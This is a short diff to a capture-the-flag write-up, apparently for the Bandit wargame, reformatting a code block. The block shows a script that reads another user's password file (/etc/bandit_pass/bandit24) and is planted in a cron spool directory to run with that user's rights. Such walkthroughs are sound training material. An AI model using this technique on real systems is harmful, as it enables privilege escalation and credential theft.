@@ -162,11 +162,9 @@ mkdir /tmp/bcbcbc
 chmod 777 /tmp/bcbcbc
 touch /tmp/bcbcbc/getpass.sh
 chmod 777 /tmp/bcbcbc/getpass.sh
-cat getpass.sh
-```
-#!/bin/sh
-cat /etc/bandit_pass/bandit24 > /tmp/bcbcbc/pass
-```
+cat /tmp/bcbcbc/getpass.sh
+    #!/bin/sh
+    cat /etc/bandit_pass/bandit24 > /tmp/bcbcbc/pass
 cp /tmp/bcbcbc/getpass.sh /var/spool/bandit24
 cat /tmp/bcbcbc/pass
 ```
